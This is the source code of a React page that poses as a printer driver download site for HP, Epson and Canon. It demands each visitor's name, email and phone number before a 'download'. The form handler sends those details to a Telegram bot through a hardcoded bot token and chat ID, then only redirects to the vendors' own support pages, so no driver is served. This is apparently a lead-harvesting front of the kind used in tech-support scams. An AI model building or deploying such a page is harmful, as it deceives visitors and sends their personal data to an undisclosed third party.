import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Card } from "@/components/ui/card";
import { Download } from "lucide-react";
import canon from "../images/canon.png";
import epson from "../images/epson.png";
import hp from "../images/hp.png";

interface FormData {
  name: string;
  email: string;
  phone: string;
}

const PRINTER_BRANDS = [
  {
    name: 'HP',
    imgUrl: hp,
    redirectUrl: 'https://support.hp.com/us-en'
  },
  {
    name: 'Epson',
    imgUrl: epson,
    redirectUrl: 'https://epson.com/Support/sl/s'
  },
  {
    name: 'Canon',
    imgUrl: canon,
    redirectUrl: 'https://www.usa.canon.com/support/software-and-drivers'
  }
];

const DriverDownload = () => {
  const [selectedBrand, setSelectedBrand] = useState<string>("");
  const [showForm, setShowForm] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
  });
  const { toast } = useToast();

  const handleBrandSelect = (brand: string) => {
    setSelectedBrand(brand);
    setShowForm(true);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const brand = PRINTER_BRANDS.find(b => b.name === selectedBrand);
    
    if (brand) {
      try {
        // Send data to Telegram
        const message = `
New Driver Download Request:
Brand: ${selectedBrand}
Name: ${formData.name}
Email: ${formData.email}
Phone: ${formData.phone}
        `;

        const response = await fetch(`https://api.telegram.org/bot7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: "1684000886",
            text: message,
          }),
        });

        if (!response.ok) {
          throw new Error("Failed to send message to Telegram");
        }

        toast({
          title: "Request Submitted",
          description: "Redirecting to download page...",
        });

        // Close the form
        setShowForm(false);
        
        // Reset form data
        setFormData({
          name: "",
          email: "",
          phone: "",
        });

        // Redirect to brand-specific URL
        setTimeout(() => {
          window.location.href = brand.redirectUrl;
        }, 1500);

      } catch (error) {
        toast({
          title: "Error",
          description: "Failed to submit request. Please try again.",
          variant: "destructive",
        });
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-white py-12">
      <div className="container mx-auto px-4">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold mb-4">Printer Driver Downloads</h1>
          </div>

          <div className="grid md:grid-cols-3 gap-8">
            {PRINTER_BRANDS.map((brand) => (
              <Card
                key={brand.name}
                className="p-8 hover:shadow-lg transition-shadow border-0 bg-white rounded-xl"
              >
                <div className="flex flex-col items-center space-y-6">
                  <div className="w-full flex items-center justify-center p-4">
                    <img
                      src={brand.imgUrl}
                      alt={`${brand.name} Logo`}
                      className="w-full h-auto object-contain"
                    />
                  </div>
                  <Button
                    className="w-full bg-blue-600 hover:bg-blue-700"
                    onClick={() => handleBrandSelect(brand.name)}
                  >
                    <Download className="mr-2 h-4 w-4" />
                    Download Driver
                  </Button>
                </div>
              </Card>
            ))}
          </div>

          <Dialog open={showForm} onOpenChange={setShowForm}>
            <DialogContent className="sm:max-w-md">
              <DialogHeader>
                <DialogTitle>Download {selectedBrand} Drivers</DialogTitle>
                <DialogDescription>
                  Please provide your information to access the driver download.
                </DialogDescription>
              </DialogHeader>
              <form onSubmit={handleFormSubmit} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input
                    id="name"
                    required
                    placeholder="Enter your full name"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    required
                    placeholder="Enter your email address"
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input
                    id="phone"
                    required
                    placeholder="Enter your phone number"
                    value={formData.phone}
                    onChange={(e) =>
                      setFormData({ ...formData, phone: e.target.value })
                    }
                  />
                </div>
                <Button type="submit" className="w-full">
                  Download
                </Button>
              </form>
            </DialogContent>
          </Dialog>
        </div>
      </div>
    </div>
  );
};

export default DriverDownload;